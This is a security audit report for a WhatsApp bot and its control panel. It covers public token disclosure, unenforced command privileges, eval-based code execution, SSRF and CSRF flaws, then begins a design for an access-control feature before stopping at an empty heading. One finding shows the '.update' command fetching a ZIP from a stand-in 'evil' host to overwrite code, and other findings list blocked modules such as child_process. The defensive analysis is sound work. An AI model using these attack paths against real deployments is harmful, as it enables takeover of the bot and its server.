# Nebula Bot — Full Technical Audit (Phase 1)

**Repository:** `JCVERSA/nova` · Branch `arena/01a04d75-nova` · Commit `a6cf57e` ("feat: implement initial nebula bot controller panel")
**Audit date:** 2026-08-29 · **Mode:** Phase 1 analysis only — **no source code was modified**
**Verification performed:** `npm install` (sandbox-safe), `npm run lint` (tsc), `npm test` (vitest), `npm run build`, targeted runtime probes against a local instance of the app.

---

## Executive Summary

Nebula is a **WhatsApp multi-device bot + web control panel** built on Baileys, React/Vite, and Express. Functionally it is far more ambitious than the README implies: 33 hand-written TypeScript commands, a **vendored 145-file third-party command corpus** ("Nebula Bot by Dark Neon / Knight Bot") bridged into the registry, an AI command builder, a ZIP exporter, an anime downloader, and a simulated batch-download dashboard.

The architecture is coherent for a single-instance app, and the build/typecheck/test surface is green (38 tests pass). The **security posture, however, is not production-ready**. The happy-path tests do not exercise the real threat model. The five most severe issues found:

| # | Severity | Finding | Evidence |
|---|----------|---------|----------|
| 1 | **Critical** | `GET /auth/token` publicly returns the panel token; every `/api/*` endpoint is then fully open (start/stop bot, wipe WhatsApp session, save/execute arbitrary code, use your Gemini credits, download project source) | `app.ts` middleware only protects `/api/*`; endpoint has no auth. Empirically reproduced. |
| 2 | **Critical** | The imported-command bridge **ignores every `ownerOnly`/`adminOnly`/`groupOnly` flag**. `.restart` (process exit / `pm2 restart all`), `.update` (download arbitrary ZIP → extract → **overwrite project files** → restart = **RCE**), `.broadcast`, `.block`, `.mute`, `.setprefix`, and ~100 more commands are callable by **any WhatsApp contact**. Only **1 of 145** vendored files does its own privilege check. | `src/bot/importedBridge.ts`; `imported/commands/owner/restart.js`, `update.js`, `broadcast.js`, `admin/kick.js` verified by inspection. |
| 3 | **Critical** | Novabox runs `eval()` on JavaScript strings extracted from third-party scraped pages (`novabox.ts:851,854`) → remote-code-execution vector via content the command itself fetches. | `novabox.ts` packed-script unpacker. |
| 4 | **Critical** | `POST /api/bot/commands/save` writes arbitrary TypeScript to disk, compiles it with esbuild, and hot-loads it with **full server privileges**. (1) makes this effectively unauthenticated RCE. | `app.ts` save route → `compileCommandToMjs` → `initRegistry` → dynamic `import()`. Write + compile reproduced in testing. |
| 5 | **High** | The **server crashes at startup** (and on every command hot-reload) when `@bochilteam/scraper`'s eager GitHub data fetch fails — an unhandled promise rejection from a vendored command import (`imported/commands/fun/truth.js`). Reproduced twice; any restricted/offline egress, transient outage, or proxy cert issue kills the whole panel. | Runtime reproduction: `npm run dev` → `RequestError` → `triggerUncaughtException`. |

---

## 1. Project Overview

**Purpose:** A deployable "controller panel" (React SPA + Express API) that operates a WhatsApp multi-device bot: QR/pairing-code login, group moderation (antilink/antitag/antibot/welcome), AI chat & image generation (Gemini), media downloading (Cobalt/ytdl/ffmpeg), dynamic hot-loadable commands (manual or AI-generated), an anime downloader (Novabox), a simulation playground, and a ZIP export for local running.

**Target platform signals:** metadata.json (`requestFramePermissions: microphone`, `majorCapabilities: SERVER_SIDE_GEMINI_API`), `.env.example` AI Studio/Cloud Run notes, iframe-embedded panel (`sameSite: none` cookie), Vite `allowedHosts: true`.

**Scale profile:** single process, single instance, JSON-file persistence. No multi-instance, no queue, no database, no autoscaling requirements. This is appropriate for the use case — do **not** introduce microservices or a DB without a real requirement.

---

## 2. Architecture Analysis

### 2.1 Textual diagram

```
Browser (panel SPA, React 19 / Vite 6 / Tailwind 4)
        │  /auth/token (public!) → token; else HttpOnly cookie (SameSite=None)
        ▼
Express app (app.ts, 1,493 lines)
 ├─ Auth middleware: PANEL_TOKEN cookie|Bearer  →  /api/*  (+ public /api/media/download/:token, /d/:token)
 ├─ In-memory rate limiter (path|ip, 300/min + stricter per-endpoint)
 ├─ Routes: bot lifecycle, QR/pairing, config, secrets (allowlist), commands (CRUD+generate),
 │          simulator, checkup, ZIP export, Gemini transcribe/voice, batch-downloads,
 │          public temp-media streamer (Range, CORS *)
 └─ server.ts: mounts Vite (dev) or dist/ (prod), listens 0.0.0.0

src/bot/
 ├─ botEngine.ts (1,209)  Baileys socket lifecycle, reconnect(5 cap), bad-session wipe,
 │                        moderation (antilink/antibot/antitag), welcome/goodbye, DM-AI,
 │                        command dispatch, context builder, simulator (mock socket)
 ├─ commandRegistry.ts    static built-ins (33) + disk commands (dev .ts / prod .compiled .mjs)
 │                        + importedBridge.ts → 115 vendored CJS commands (metadata ignored)
 ├─ commandCompiler.ts    esbuild bundle *.ts → .compiled/*.mjs (hot reload)
 ├─ geminiClient.ts       text fallback chain, image gen, Pollinations fallback
 ├─ database.ts           JSON groups.json / warnings.json (atomic, serialized, in-memory cache)
 ├─ config.ts             database/config.json (+ NEBULA_DATA_DIR override)
 ├─ commandStats.ts       database/stats.json (500ms debounced)
 ├─ secrets.ts            .env allowlist writer (atomic) + process.env application
 ├─ urlSafety.ts          SSRF guard: scheme/IPv4/IPv6/localhost/DNS/redirect re-validation
 ├─ tempDownloadManager.ts  random 24-byte tokens, TTL 60–120 min, 5-min sweeper
 ├─ batchDownloadManager.ts  simulated batch jobs (panel demo only)
 └─ commands/*.ts         33 built-ins; novabox.ts (1,579 lines) is the outlier
```

**Data flow (WhatsApp):** `messages.upsert` → unwrap ephemeral/viewOnce → text extract → group admin resolution (30 s metadata cache) → moderation filters (delete/kick/warn) → DM-AI shortcut → registry lookup → context built → `execute(sock, msg, ctx)` → replies via `replyHandler` (typing simulation, buffers, data-URI decode) → stats increment.

### 2.2 Strengths (verified)

- **Good separation of testable core:** `createApp()` is injected and tested with supertest; env overrides (`NEBULA_DATA_DIR`, `NEBULA_COMMANDS_DIR`, `NEBULA_ENV_FILE`, `PANEL_TOKEN`) make tests hermetic (`tests/setup.ts`).
- **Strong baseline security primitives** in the *native* code: SSRF guard with private-range + DNS + redirect-hops validation and unit tests; secrets allowlist with masked-only reads and atomic `.env` writes; command-name sanitization; HTML escaping before WhatsApp-markdown rendering (`formatMessageLine` → no simulator XSS); bounded logs (200), bounded rate-limit map (5,000 with sweep); 5-attempt reconnect cap; bad-session auth wipe; temp-download tokens are 192-bit random.
- **Sensible energy budget:** 10-minute video cap, 50 MB WhatsApp send thresholds, `AbortSignal.timeout` on Cobalt API calls, per-endpoint rate limits on the expensive routes.
- **Honest operational visibility:** real uptime/memory in checkup, real (non-fabricated) command stats, truthful error propagation from Gemini.

### 2.3 Weaknesses (see findings for details)

- `app.ts` is a 1,493-line monolith holding auth, rate limiting, config, secrets, ZIP packaging (250+ lines of embedded template code), Gemini proxying, and media streaming — hard to reason about, hard to test incrementally, and the source of most auth/CSRF seams.
- **Two codebases in one repo:** the vendored `src/bot/imported` tree (145 commands, its own `config.js`, `database.js`, `utils/*`, `economy_db.json`) is loaded via `importedBridge` with a thin adapter. It has its own permission model (metadata), API-key fallbacks, and file/network behavior — none of it audited, none of it enforced.
- `novabox.ts` is a 1,579-line scraping/download subsystem inside a command file, using `child_process`, `eval`, and no SSRF guard — architecturally it should be its own module/service with strict resource governors.
- Persistence is JSON files with in-memory caches: no migrations, no locking across processes, and several unbounded caches.
- Docs drift from reality (see Findings M/F & Low).

### 2.4 Scalability

The current design **does not need** horizontal scaling. It is a single-owner bot. Real bottlenecks are (in order): (a) unbounded disk/memory work triggered by untrusted WhatsApp users (Novabox, temp downloads, media buffers), (b) 25 MB JSON body / 30 M base64 mismatch for audio, (c) per-process rate limiting (fine today; becomes a problem only behind multiple replicas, which is not a requirement). Any future multi-instance work should first move state to an external store — **only if a concrete requirement appears**.

---

## 3. Dependency Review

`npm audit --omit=dev` → **0 vulnerabilities** against the public advisory DB (good). `npm run lint` (strict TS) passes.

| Dependency | Use | Risk | Notes |
|---|---|---|---|
| `@whiskeysockets/baileys` `^7.0.0-rc14` | WhatsApp engine | **Medium** | Pre-release (`-rc`); API churn. Pin exact version; upgrade deliberately. |
| `ytdl-core` `^4.11.5` | YouTube download | **High** | Effectively archived; frequently breaks against YouTube; fetches user-supplied hostnames (see H2). |
| `ffmpeg-static` | ffmpeg binary | **Medium** | Install script downloads from GitHub at install time (failed in sandbox; blocks offline installs). `fluent-ffmpeg` is **deprecated/unmaintained** (npm warning). |
| `@bochilteam/scraper` `^5.0.1` | truth/joke data | **High** | Eager network fetch at import time (`got` → GitHub raw) with **no error handling → crashes the process** (H1). Vendored command dependency — not in root package.json use path, imported via vendored require. |
| `mumaker`, `node-webpmux`, `ruhend-scraper`, `@vitalets/google-translate-api`, `@bochilteam/scraper` | media/entertainment | **Medium** | Undetermined maintenance; `mumaker` is an external textmaker API wrapper (network egress to third parties). |
| `axios`, `cheerio`, `node-fetch`, `pino`, `express` 4.x, `adm-zip`, `qrcode` | core | Low | Standard, widely used. Express 4 → consider 5 only when the ecosystem allows. |
| Frontend stack (`react@19`, `vite@6`, `tailwind@4`, `recharts`, `motion`, `lucide`) | panel | Low | Well maintained. |
| **Bundling** | | **Medium** | **Two lockfiles** (`bun.lock` + `package-lock.json`) with the same payload — divergence risk. `esbuild` is a **runtime** dependency of the command compiler (dev-only intent), so production images must keep it. |
| Vendored corpus | | **High** | ~145 un-versioned third-party files with hardcoded API fallbacks, embedded `economy_db.json`, and branded artifacts (Knight Bot / Dark Neon). **No license file** — redistribution/rebranding risks. |
| Missing | | | `whatsapp-rust-bridge` is required by ~30 vendored commands and is **not declared anywhere** → those commands silently fail to load at startup (observed: 115/145 adapted). No linter (`eslint`/`prettier`) despite 12k+ lines. |

**Policy recommendation:** do not add dependencies for the fixes below — all critical fixes are code-level (auth, enforcement, caps). Replace `ytdl-core` when feasible; prefer streaming with explicit size/time limits over new packages.

---

## 4. Security Review

> Verified by static analysis + runtime reproduction. "Reproduced" = observed in a live local instance (`createApp` + tsx) or via `npm test`.

### CRITICAL

**C1 — Panel token disclosure via public `/auth/token`** · `app.ts:249`
The auth middleware only guards paths starting with `/api/`; `/auth/token` responds `{ token: panelToken }` to **anyone**. Reproduced: an unauthenticated `GET /auth/token` returned the same token that unlocks every `/api/*` route.
*Impact:* complete takeover of a deployed panel — start/stop/wipe WhatsApp session (`clear-auth`, `retry`, `pair-code`), set secrets, export source ZIP, spend Gemini quota, and save+execute arbitrary code (see C4).
*Fix:* remove the endpoint; deliver the token **only** via the HttpOnly cookie (which requires an actual login — see H7/M1); require a user-supplied `PANEL_TOKEN` (presently the auto-generated "token" makes the auth cosmetic — the frontend just asks the server for it).

**C2 — Imported commands run without any privilege enforcement** · `src/bot/importedBridge.ts` + `src/bot/imported/**`
The bridge maps metadata `ownerOnly`/`adminOnly`/`groupOnly`/`botAdminNeeded` to `BotCommand` but **never checks them**. Grep: only **1 of 145** vendored files references `extra.isOwner/isMod/isAdmin`; all others rely on flags nobody reads. Concrete reachable commands (no built-in shadow): `.restart` → `process.exit(0)` or **`pm2 restart all`**; `.update [https://evil/zip]` → downloads arbitrary ZIP (no SSRF guard), extracts, **copies files over `process.cwd()`, restarts** → **RCE**; `.broadcast` → spam every group (anti-ban delay loop, 3–7 s × N); `.block`, `.unblock`, `.mute`, `.tempban`, `.delete`, `.clean`, `.setprefix`, `.setbotname`, `.setmenuimage`, `.mode`, `.newsletter`, `.gm`, `.remote`, `.schedule`, `.warn`, `.tagadmins`, …; `.kick`/`.promote`/`.demote`/`.hidetag` are shadowed by safe TS built-ins (good), but `.add` can still add members from any group.
*Impact:* any contact of the bot can **kill it, rewrite its code, spam all groups, and run admin actions in every group**. This is the highest-impact finding, aggravated by DM-AI routing: commands run in DMs too.
*Fix:* enforce metadata at the **bridge boundary** (single enforcement point, honoring `extra.isOwner/isAdmin/isGroup/isBotAdmin`), default-deny for `owner` category, and add integration tests. Optionally delete the entire `imported/` tree (it doubles the attack surface and much of it is unmaintained).

**C3 — `eval()` on third-party scraped JavaScript** · `src/bot/commands/novabox.ts:851,854`
The VidMoly packed-script unpacker evals string literals taken from fetched HTML.
*Impact:* RCE from any content the site (or a compromised CDN / MITM / rebinding) returns; confirmed by esbuild's `direct-eval` warning during `npm run build`.
*Fix:* decode the Dean-Edwards payloads without `eval` (implement the unpacker arithmetically, as widely published) and drop the regex-`eval` fallback entirely.

**C4 — Arbitrary code execution through command save/generate** · `app.ts:772-863`
`POST /api/bot/commands/save` validates only name shape + ≤100 KB, writes `src/bot/commands/<name>.ts`, esbuild-bundles it, and `initRegistry()` dynamically imports it. Reproduced: file written + `.compiled/*.mjs` produced from attacker-controlled source (simulation only; removed afterward). The `generate` endpoint's keyword blacklist ("child_process", "exec(", …) is bypassable and irrelevant — the raw `save` endpoint accepts any code.
*Impact:* with C1, unauthenticated RCE. Even with proper auth, the panel operator is implicitly trusted, so the risk is bounded — but the API is still exposed to CSRF (H5) and XSS-adjacent sessions.
*Fix:* (1) make save/generate require an explicit, non-public authz (C1 fix); (2) run generated commands in a **worker with a capability-limited context** (no `fs`/`child_process`/network by default, explicit allowlist of the documented command context), or at minimum sandbox with `vm`/worker thread + resource limits; (3) reject `import` of `node:*`, `child_process`, `fs`, `net`, `http`, `https`, `dns`, `os`, `path` in saved code.

### HIGH

**H1 — Startup/runtime crash from vendored eager network fetch** · `imported/commands/fun/truth.js` → `@bochilteam/scraper`
`require('@bochilteam/scraper')` at registry init triggers `got` fetching `github.com/.../jadwal-sholat.json`; failure is an **unhandled rejection** that kills the process (`triggerUncaughtException`). Reproduced twice (TLS-proxy failure and reset), and it also crashes **any command save/generate reload**. Independently of the sandbox, any transient GitHub/egress failure = full panel outage.
*Fix:* don't eagerly load submodules at import; wrap registry imports in a try/catch that also registers `process.on('unhandledRejection')` top-level; or drop the vendored command; add a startup smoke test with network blocked.

**H2 — SSRF gaps** · `urlSafety.ts` + `novabox.ts` + `video.ts` + `imported/owner/update.js`
- `safeFetch` validates each hop then calls `fetch` — the fetch re-resolves DNS (**DNS-rebinding TOCTOU**); the robust fix is pinning the resolved IP (undici `lookup`/`connect` option) or using an agent that validates on connect.
- `isPrivateIpv4` misses `198.19.0.0/16` (only `198.18.` covered) and `192.0.2/24`, `198.51.100/24`, `203.0.113/24` (documentation — low value but cheap to add); IPv6 hex-form IPv4-mapped (`::ffff:7f00:1`) bypasses the `::ffff:` branch.
- **Novabox fetches/extracts URLs from scraped pages with zero validation** (`axios.get` on embed pages, ffmpeg `-i` on extracted HLS URLs, `probeMediaHeaders`). Arbitrary server-side fetch + **SSRF via ffmpeg** if a site returns an internal URL.
- `.update` accepts any `http(s)` zip URL and downloads it server-side with no guard (also C2).
- `video.ts` accepts `rawUrl` if it merely **contains** "youtube.com" (e.g. `youtube.com.evil.com`) and passes it straight to `ytdl.getInfo()` — no `isSafeDownloadUrl` on that hop.
*Impact:* SSRF to cloud metadata/internal services, and third-party-dependent code execution paths.
*Fix:* thread `safeFetch`/`isSafeDownloadUrl` through every outward fetch (esp. novabox, vidmoly, update); pin DNS resolution for `safeFetch`; tighten `ytdl` host validation to exact allowlist (`youtube.com`, `youtu.be`, `m.youtube.com`); never pass scraped URLs to ffmpeg without validation.

**H3 — No resource caps on untrusted work** · `novabox.ts`, `tempDownloadManager.ts`, `download.ts`, `botEngine.ts`
- Novabox whole-season mode: `selectedEpisodeIndices = all episodes` (no cap), each ep 100–500 MB via ffmpeg, sequential; any user can trigger, no auth, no global concurrency limit.
- Temp downloads: `activeDownloads` map and `TEMP_DOWNLOAD_DIR` have **no record/byte cap**; each registration copies the file (double disk for move:false paths). Any WhatsApp user can heap these.
- `download.ts` `safeFetch` has **no timeout or max-size guard** — a slow/huge response holds the handler and memory indefinitely (the 100 MB check happens **after** the full buffer).
- `botEngine.mediaDownloader` concatenates chunks with no cap → multi-hundred-MB media in one process.
*Impact:* disk/memory/bandwidth exhaustion and egress cost from unauthenticated contacts.
*Fix:* global budget (e.g. max 2 concurrent jobs, 5 GB temp, per-user concurrency 1), stream-to-disk with byte caps + timeouts, delete temp records on job completion, cap season batches (e.g. ≤ 8 files / ≤ 2 GB), enforce max media size (e.g. 100 MB) **before** buffering.

**H4 — Open AI proxy (cost abuse)** · `botEngine.ts` DM-AI path, `commands/ai.ts`, `image.ts`
Any contact can prompt Gemini repeatedly (`/ai`, `/image`, and **automatic DM replies to every non-command PM**). No per-user/global quota or allowlist. Cost and rate-limit abuse are trivial; `generateTextWithFallback` also logs every query.
*Fix:* per-user sliding-window + daily budget, optional owner-only mode (`NEBULA_AI_ALLOWLIST` / `selfMode`), disable DM-auto-AI by default or gate behind owner.

**H5 — CSRF on state-changing endpoints** · `app.ts` auth middleware
Cookie is `HttpOnly; SameSite=None; Secure` (verified in `Set-Cookie`). With `SameSite=None` the cookie is sent on cross-site requests; endpoints like `POST /api/bot/start|stop|clear-auth|retry|clear-logs`, `POST /api/batch-downloads/cleanup`, `POST /api/bot/commands/*` are reachable via simple form POSTs (no preflight needed since `express.json` only parses JSON; these routes ignore the body). Result: an arbitrary page loaded by the operator can wipe the WhatsApp session, restart, or trigger heavy work.
*Fix:* for cookie-based auth require an `Origin`/`Referer` check against `APP_URL`/request host (reject cross-site), or require a custom header (`X-Requested-With`) that triggers CORS preflight; keep bearer-token auth for tooling. Never rely on the cookie alone.

**H6 — `startLiveBot` race → duplicate WhatsApp sessions** · `botEngine.ts:335`
Guard is `status === "connected"` only; two rapid `/api/bot/start` calls both pass (the function awaits `initRegistry`, auth state, version fetch before assigning `botState.socket`) → two live sockets, duplicated listeners, Stream-Conflict 401s and auth-wipe fights.
*Fix:* in-flight promise lock / `starting` state; serialize start/stop/pair/clear endpoints through a single state machine.

**H7 — Latent privilege escalation in adapter** · `src/utils/adapter.ts`
`buildAdapterContext` sets `isOwner = sender.startsWith("447") || sender.startsWith("33") || fromMe` — **any UK/French number is "owner"**, `isAdmin: false` hardcoded, prefix hardcoded `"."`. It is currently unused by the engine (dead code) but is exactly the kind of utility a future integration will call.
*Fix:* delete it, or implement real owner resolution via config and keep it under tests.

**H8 — Rate limiting can be bypassed** · `app.ts` rate limiter + `app.set("trust proxy", true)`
Key is `path|req.ip`; with `trust proxy: true`, Express trusts the leftmost `X-Forwarded-For`, which a direct client can spoof to rotate identities → unlimited calls to Gemini, checkup, simulate, pair-code, and the aggressive endpoints. Also no **global** concurrency quotas (only per-(path,ip)).
*Fix:* `trust proxy` to the known proxy hop(s) (or 1) and/or key on the socket peer; add global token-bucket + per-IP in front of the expensive routes (already partially there) and a global body-budget.

### MEDIUM

- **M1 — There is no real authentication.** Token auto-generation + public issuance + cookie hand-out means "authenticated" ≈ "knows the URL". `.env.example`/README describe a WhatsApp OTP login (`ADMIN_NUMBERS`, `NEBULA_ALLOW_REGISTRATION`) that is **not implemented anywhere** (grep: zero references in server code). Implement the OTP/account flow or document the honest threat model and require `PANEL_TOKEN` to be explicitly set.
- **M2 — `sessionString` in config is returned by `GET /api/bot/config` and embedded in the ZIP export** (`config.json` > `sessionString`) if it is ever populated (engine doesn't use it — see Dead Code), and `config.json` is written non-atomically. Strip it from API/export and from the config schema.
- **M3 — Host-header poisoning of temp download URLs.** `updateServerBaseUrl` uses `req.headers.host` + `x-forwarded-proto` from the **first** request (no `APP_URL` set) — attacker-controlled Host → poisoned public links sent to WhatsApp users. Prefer `X-Forwarded-Host` behind the trusted proxy, or require `APP_URL`.
- **M4 — `.env` injection via secrets.** `setSecret` doesn't reject `\r\n` in values (only `\` and `"` are escaped when quoting) → a malicious/accidental newline writes extra env assignments into `.env` on restart. Validate `^[A-Za-z0-9_\-\.\+/]+$` (Gemini keys match) and forbid CR/LF.
- **M5 — Antibot false positives.** `isPotentialBot` treats `msg.key.id.length === 32` and the `3EB0`/`BAE5` prefixes as bot signatures; WhatsApp message IDs are (commonly) 32-char hex identifiers beginning with those bytes, so **enabling antibot can delete legitimate human messages**. Needs empirical confirmation on live traffic (we could not test against real WhatsApp here) — high suspicion, must be validated before release.
- **M6 — Message-content PII logging.** Every received message is logged (`botEngine` `addLog`) → panel logs + server console expose group/private content and sender numbers. Redact/truncate or make logging opt-in.
- **M7 — Unbounded caches.** `groupMetadataCache` (entries never pruned for departed groups), `warningsCache` + `warnings.reasons[]` (grow per user, never expire), `database.getGroupSettings` creates entries on read, `batchJobs` capped at 20 (good). Add TTLs/caps.
- **M8 — Non-atomic/unsynced persistence.** `config.json` direct `writeFileSync`; `stats.json` direct write (500 ms debounce, no flush on exit); DB atomic writer is per-file serialized but never awaited before shutdown → lost/corrupt state on crash. Add atomic temp+rename for config/stats and a graceful flush.
- **M9 — Checkup is an expensive, partly-external endpoint** (12 command simulations incl. weather/network calls + DB write/revert) under only the 300/min general limiter. Give it its own limit and disable the network-dependent probes.
- **M10 — Payload limit mismatch.** Body limit is 25 MB but transcribe advertises ~30 MB base64 (~22 MB audio); effective max is ~18.7 MB. Align constants and return 413 with the true cap.
- **M11 — Delegated-URL hand-off.** `sweb` (microlink) and the Pollinations image fallback send user prompts/URLs to third parties; the bot then downloads the returned URL server-side. Fine for public data, but document it; add explicit user consent copy for the fallback engine.
- **M12 — Startup fragility/vendor breakage.** 30/145 vendored commands fail to load because `whatsapp-rust-bridge` is not a declared dependency; menu surface depends on whatever happens to load. Either vendor it, drop those commands, or fail loudly.
- **M13 — No security headers.** No CSP/HSTS/X-Frame-Options for the panel HTML (the iframe scenario needs care, but a CSP with `frame-ancestors` for `APP_URL` is achievable); no `helmet`.

### LOW

- **L1 — Docs drift:** README says "21+ commands" (125 loaded); `.env.example` documents the unimplemented OTP system and omits `NEBULA_ENV_FILE`, `NEBULA_COMMANDS_DIR`, `NEBULA_AUTH_DIR`; "secure cookie for ALL environments" is false for plain-HTTP dev without a secure context.
- **L2 — Dead code:** `src/utils/adapter.ts` (unused, unsafe), `sessionString` field, `regexTranspile` fallback (esbuild is always available in dev; the fallback silently corrupts code with regex-replacements), `updateGlobalCommands` global mutation, mock-socket on top of mock-context (simulator could be simpler).
- **L3 — Duplicated loading:** `novabox.ts` is statically imported *and* re-loaded from disk (`Loaded command from disk: anime`) every `initRegistry`; `novabox` exists as both `anime` (novabox.ts) and `novabox` name — check menu.
- **L4 — Dev/build hygiene:** no ESLint/Prettier/CI config; dual lockfiles; `esbuild` must be a production dependency (it is, listed in devDependencies — so `npm ci --omit=dev` in a production image **breaks command save/generate** — Medium actually; call it **M14**).
- **L5 — Tests don't cover the top risks:** no test for `/auth/token` exposure, bridge authorization, `eval` in novabox, `startLiveBot` race, SSRF rebinding, or CSRF. (Coverage: 38 tests, 4 files; no coverage tooling configured.)

---

## 5. Code Quality Findings

**Strengths:** consistent TS interfaces (`BotCommand`/`BotCommandContext`), clear naming, defensive `try/catch` around most async boundaries (engine, adapter), comments explaining *why* in the sensitive spots (reconnect budget, cookie policy, SSRF), genuine validation on API inputs (lengths, allowlists, prefix rules), and a well-isolated test setup that never touches real state.

**Weaknesses:**
- **Monoliths:** `app.ts` (1,493), `botEngine.ts` (1,209), `novabox.ts` (1,579), `App.tsx` (4,944 — one component; no route structure, no component decomposition beyond presentational helpers). Functions like `createApp` return handlers that capture dozens of closures; testability suffers (real behavior only testable via HTTP).
- **Error-handling asymmetry:** heavy `catch`-and-log in the engine (good) vs. raw `error.message` interpolated into WhatsApp replies (info leak of server internals to any user — low but sloppy) vs. the one unhandled rejection that kills the process (H1).
- **Validation is ad-hoc:** `sanitizeConfig` re-implements per-field rules by hand; `regexTranspile` is a hand-rolled JS subset transpiler with no tests; range parsing in the media route has odd edge handling (interpreted `bytes=-N` correctly rejects, but the logic is fragile).
- **Duplicate logic:** media download (engine + adapter), context builders (engine + adapter), Cobalt instance lists (download.ts + video.ts), "update config" paths (panel + owner command), two entire config/database ecosystems (native vs imported).
- **Secrets handling is actually good** (masked status, allowlist, atomic writes) — the problem is the *auth around it*, not the module.

---

## 6. Performance Findings

1. **Media buffering** — `Buffer.concat` per chunk in engine/adapter/command downloads; O(n²) for large media. Stream to disk or preallocate; enforce byte caps (H3).
2. **`safeFetch` without timeout** in `download.ts` and picker loop (H3).
3. **Novabox season downloads** — sequential ffmpeg runs, 15–35 s timeouts each, ~100–500 MB each; the same command holds no global semaphore (H3).
4. **Checkup latency** — 12 simulations incl. network calls on demand; ~2–8 s; adjust limits (M9).
5. **Panel polling** — `/api/bot/status` + `/api/bot/analytics` every 3 s per client; trivial today, but no push (SSE/WebSocket) — acceptable at this scale.
6. **Gemini retry patterns** — fixed 1 s backoff, 3 models × 3 tries worst case = slow worst-path UX; acceptable, add jittered backoff later.
7. **`updateServerBaseUrl`/host sniffing on every request** — nil cost, but correctness issue (M3).
8. **Log build** — `addLog` string-templates on every message incl. PII; fine at 200-cap.

---

## 7. Feature Opportunities (prioritized by value / risk-reduction)

| Priority | Feature | Rationale |
|---|---|---|
| 1 | **Real panel authentication (OTP login or mandatory `PANEL_TOKEN` + origin checks)** | Removes C1/C5/M1; enables multi-user roles. |
| 2 | **Declarative command access control + audit trail ("RoleGuard")** — see §9 | Turns the unenforced `ownerOnly`/`adminOnly` into a real, centralized policy system; also fixes C2 and gives group admins a management surface. |
| 3 | **Resource governor for media/Novabox** (per-user concurrency, byte quotas, streamed delivery) | Prevents disk/cost DoS; unblocks safe public use. |
| 4 | **AI cost visibility & budget** (per-user usage, quota dashboard, owner-only toggle) | Directly tames H4. |
| 5 | **Group settings management surface** (welcome/antilink/abuse policies per group from the panel, not only via chat commands) | Natural for admins; reuses existing JSON store. |
| 6 | **Observability** (structured pino logs, health endpoint, `/metrics`-lite, error reporting) | Startup/postmortem visibility; currently only console + 200-line log buffer. |
| 7 | **Backup/restore** (config+groups+stats JSON export/import with signatures) | JSON persistence = trivial to get right; high ops value. |
| 8 | **Simulator expansion** (session-stateful simulation for Novabox/multi-step flows) | Big DX win; today the simulator cannot exercise interactive flows. |

---

## 8. Improvement Opportunities (DX / Ops)

- **CI:** GitHub Actions: `npm ci` → `npm run lint` → `npm test` (with `NEBULA_*` envs as in `tests/setup.ts`) → `npm run build`; add a `startup` smoke test that boots `createApp` with **network blocked** (catches H1).
- **Quality gate:** ESLint (typescript-eslint) + Prettier; spellcheck disabled; add `vitest` coverage (`@vitest/coverage-v8`) with an admission threshold.
- **Config:** single source of truth for env vars (`PORT`, `NEBULA_*`, `APP_URL`) with runtime validation at boot and a `GET /api/health` that surfaces missing required config.
- **Deployment:** run as a non-root user, read-only app dir where possible (write state only under `NEBULA_DATA_DIR`, which should be a volume), ephemeral `/tmp` for media; `esbuild` present in prod image or disable save/generate there.
- **Testing additions (must-have before Phase 2):** `/auth/token` 401/404 test; bridge-ACL tests for `.restart`, `.broadcast`, `.update`, `.kick`; `startLiveBot` double-invoke test; `safeFetch` pinned-DNS test; Novabox cap tests (mock scraper); CSRF origin-check test.
- **Docs:** rewrite README "Security Notes" to match reality post-fix; document the OTP design or remove it from `.env.example`; add a SECURITY.md with the threat model and responsible-disclosure note.

---

## 9. NEW FEATURE DESIGN — "RoleGuard": Declarative Command Access Control + Audit Trail

*Chosen because it directly converts findings C2/M1/H5 into a feature, it is grounded in existing architecture (no new infra), and it delivers immediate admin value: group policy management, enforcement, and visibility.*

### 9.1 Requirements

- **R1 (Enforcement):** centralize authorization. Every command (native or imported) passes one policy check before execution; imported metadata (`ownerOnly`, `adminOnly`, `groupOnly`, `botAdminNeeded`) is honored by the bridge — nothing is trusted from command code.
- **R2 (Policy model):** three roles — `owner` (bot owner), `admin` (group admin), `member` — with per-group: `default: allow|deny`, `deny: command/category list`, `allow: command/category list` (allow-overrides-deny for owner; deny-overrides-allow for member), plus global defaults in `config.json`.
- **R3 (Capability)** built-in rules: commands tagged `ownerOnly` are member/admin-denied (owner only); `adminOnly` → member-denied; `groupOnly` → DM-denied; `botAdminNeeded` → engine checks `isBotAdmin` and replies with configurable message (previously unimplemented).
- **R4 (Audit):** append-only JSONL (`audit.jsonl`, capped 5,000 events / 90 days), fields: ts, group, sender, command, decision (allow|deny), role, reason, policyVersion. Never stores message content (PII-minimal, addresses M6).
- **R5 (Admin UX):** panel section **Access Control & Audit** — group table (enabled groups w/ settings), policy editor (chips for commands/categories), audit viewer with filters + "export CSV", quick "test decision" simulator for a role+command.
- **R6 (No new deps):** pure TS + existing JSON store. Feature flag `NEBULA_POLICY_MODE = permissive|strict` (default `strict` = current metadata semantics enforced; `permissive` = registry behaves as today for migration).

### 9.2 Architecture

```
BotCommand (cmd: name, category, parentCategory, aliases, metadata?)
        │
        ▼
 ┌─ Engine entry (botEngine.handleCommand) ─────────────────────────────┐
 │  1. resolveRole(ctx)          owner|admin|member (existing resolution)│
 │  2. policy = getPolicy(groupId or global)  ← database v2             │
 │  3. decision = authorize(cmd, role, ctx, policy)   [pure, tested]    │
 │  4. if allow → execute; if deny → audit + optional reply             │
 └──────────────────────────────────────────────────────────────────────┘
        ▲
 importedBridge command wrappers: metadata → effectivePolicyTags
        │
 Panel: GET/PUT /api/bot/groups/:id/policy  ·  GET /api/bot/audit
```

- **New module `src/bot/accessControl.ts`:** `authorize()`, `resolveRole()`, `mergePolicies()`, policy schema + migration; ~150 lines, unit-testable with zero Baileys.
- **`database.ts` v2:** `groups.json` gains `policy: { mode, admin: {...}, member: {...} }` while keeping `updateGroupSettings` backward-compatible (schema migration: read v1 → merge defaults → write v2 on first save).
- **Bridge change:** wrap `rawCmd.*` flags → tags; the wrapper refuses to add commands whose tags are unenforceable (fail-closed) and `authorize()` is called with the tags.
- **No new HTTP surface beyond the two panel routes**; rate-limit them (150/min general + 1,000/min audit reads).

### 9.3 API design

```
GET  /api/bot/access/policy?group=<jid>          → { group, policy, effectiveRules }
PUT  /api/bot/access/policy                       body { group, policy }
POST /api/bot/access/check                        body { role, command, group } → { allowed, reason } (simulator)
GET  /api/bot/audit?group=&command=&role=&from=&to=&limit=200
GET  /api/bot/audit/export.csv
```
Errors: `400` invalid policy, `404` unknown group, `401` unauthenticated (after C1 fix). All routes require auth; audit endpoints additionally rate-limited.

### 9.4 Security design

